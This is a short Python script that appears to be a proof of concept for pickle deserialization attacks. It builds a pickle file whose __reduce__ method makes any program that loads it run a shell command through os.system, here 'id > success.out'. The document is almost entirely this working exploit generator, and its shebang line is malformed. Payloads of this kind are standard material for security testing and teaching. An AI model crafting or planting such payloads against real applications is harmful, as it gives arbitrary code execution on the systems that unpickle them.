#!/bin/bash/env python3

import pickle, os
from base64 import b64encode

class abc(object):
    def __reduce__(self):
        return(os.system, ("id > success.out",))

dump = pickle.dumps(abc())
with open('data.pickle', 'wb') as file:
    pickle.dump(abc(), file)